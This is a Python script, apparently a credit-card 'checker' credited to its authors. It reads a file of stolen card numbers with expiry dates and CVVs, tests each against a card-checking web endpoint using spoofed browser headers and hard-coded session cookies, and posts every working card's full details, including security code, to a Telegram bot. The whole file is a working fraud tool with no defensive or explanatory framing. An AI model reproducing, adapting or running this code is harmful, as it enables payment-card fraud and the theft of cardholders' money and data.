
import os
import sys
import time
import json
import requests
import random
import user_agent
from user_agent import generate_user_agent
from concurrent.futures import ThreadPoolExecutor
import urllib 
import threading
import urllib.request
import os
import platform
from cfonts import *
import time
from time import sleep
from names import get_first_name


class text:
   def __init__(fx):
      for quck in fx+'\n':
         sys.stdout.write(quck),
         sys.stdout.flush()
         sleep(0.03)

cc_visa=[]
hit_visa=0
bad_visa=0
data_visa=0
uplod_visa=[]
retries=0

print(              ""              )
token=input(f'\033[1;37m\033[1m[+]\033[0;32m\033[1m Token-Bot:\033[1;37m\033[1m ')
ID=input(f'\033[1;37m\033[1m[+]\033[0;32m\033[1m ID-Tele..:\033[1;37m\033[1m ')
os.system('clear')
def sleepcc():sleep(1)
def clear_screen():
  os.system('cls' if os.name == 'nt' else 'clear')
def input_cc():
     cc_combo=input(f"\033[1;37m\033[1m[+]\033[1;33m\033[1m Put Combo Visa[Cvv]:\033[1;37m\033[1m ")  
     try:
        for w in open(cc_combo,'r').read().splitlines():
          cc_visa.append(w.strip())
     except Exception as e:print( '\033[0;31m\033[1mError - ',str(e))  
def open_visa():
   for visa_cc in cc_visa:
      goto_check(visa_cc)    
def send_message(money,types,visa_cc,num_one):
     mess=f"""
Visa dummy Bank 💥
_________________________
✅Bin: {num_one}
✅Money: {money}
✅Type: {types}
✅Number: {visa_cc.split('|')[0]}
✅Year: {visa_cc.split('|')[2]}
✅Month: {visa_cc.split('|')[1]}
✅Security: {visa_cc.split('|')[3]}
✅Visa: {visa_cc}
_________________________
Byyy: @apoOKa0
"""
     requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={mess}')
def data_tool():
   names=os.name
   Clear=os.system('clear')
   users_agentsss=user.agent.generate_user_agent()
   platform.architectur()[0]
def menu():
   lo=render('Team3742 ',colors=['red','red'],align='center')
   print('\033[1;37m\033[1m-'*40)
   print(lo)
   print( '\033[1;33m\033[1mCode Byyyyyy <> Appollo ')
   print('')
   print('\033[1;37m\033[1m-'*40)         

def cookies():
    return {
    '_ga': 'GA1.1.900894339.1756239648',
    'FCOEC': '%5B%5B%5B28%2C%22%5Bnull%2C%5Bnull%2C4%2C%5B1756239650%2C358684000%5D%5D%5D%22%5D%5D%5D',
    '_ga_3ZZ1FHXDNZ': 'GS2.1.s1756297162$o4$g0$t1756297162$j60$l0$h0',
    'PHPSESSID': 'qb8s8c6mpl094bbl9r3r28mgd6',
    '__gads': 'ID=aa7b4f48f40eb9bd:T=1756239648:RT=1756300535:S=ALNI_MZeKVvtg7jZU8pjYaIvkeXQeZn6nA',
    '__gpi': 'UID=0000126c14ac2345:T=1756239648:RT=1756300535:S=ALNI_MYSKeJIGJO8JSRQ1esd0-mJXFswew',
    '__eoi': 'ID=a43e4e3fb0bf0975:T=1756239648:RT=1756300535:S=AA-AfjbCLs8wQptfTBNSL51hSREh',
    'FCNEC': '%5B%5B%22AKsRol8Hrbe5gqqlkxzoCs6IBzUVRvBQCU27AF7-PN7tfUgbYpnTP940KH_v6mSQt4B0c5mksL-FlA9jvznsTJUa9Dl9cuFOlffF8L5OdBIHjUthsMeVGdr5pN4h_g5RCz9A5zhDBmyEC9vbVHE4d9VPWf8skgemeQ%3D%3D%22%5D%5D',
    }

def headers():   
    return {
    'authority': 'sandbox.payate.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://sandbox.payate.com',
    'referer': 'https://sandbox.payate.com/ccn1/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }
def payload(visa_cc):
    return {
    'ajax': '1',
    'do': 'check',
    'cclist':visa_cc,
    }

def goto_check(visa_cc):
    global bad_visa,hit_visa
    response = requests.post('https://sandbox.payate.com/ccn1/alien07.php', 
    cookies=cookies(),
    headers=headers(),
    data=payload(visa_cc)
    ).text
    if '"error":0,"msg"' in response:	
        num=visa_cc.split('|')[0]     
        num_one=num[0:6]  
        types = response.split("[")[1].split(" :<font color=green>")[0]
        money = response.split(" :<font color=green>")[1].split("</font>] [BIN:")[0]
        #res=requests.get("https://lookup.binlist.net/"+num_one)
        res="apo"
        if res == "apo":
            print(f"\033[0;32m\033[1mOpen--[🔓]\n{'_'*40}\n\033[0;32m\033[1m✅VISA - {visa_cc}\n\033[0;32m\033[1m✅BIN - {num_one}\n\033[0;32m\033[1m✅TYPE - {types}\n\033[0;32m\033[1m✅MONEY - {money}\n{'_'*40} ")
            send_message(money,types,visa_cc,num_one)
            hit_visa+=1
        else:
          pass
    else:
        num=visa_cc.split('|')[0]     
        num_one=num[0:6]  
        print(f"\033[1;33m\033[1mClose--[🔒]\n{'_'*40}\n\033[1;33m\033[1m❌VISA - {visa_cc}\n\033[1;33m\033[1m❌BIN - {num_one}\n\033[1;33m\033[1m❌TYPE - 0\n\033[1;33m\033[1m❌MONEY - 0\n{'_'*40} ")
        bad_visa+=1              
def main():
   clear_screen()
   os.system('clear')
   menu()
   sleepcc()
   input_cc()
   open_visa()
   



if __name__ == '__main__':
    main()
    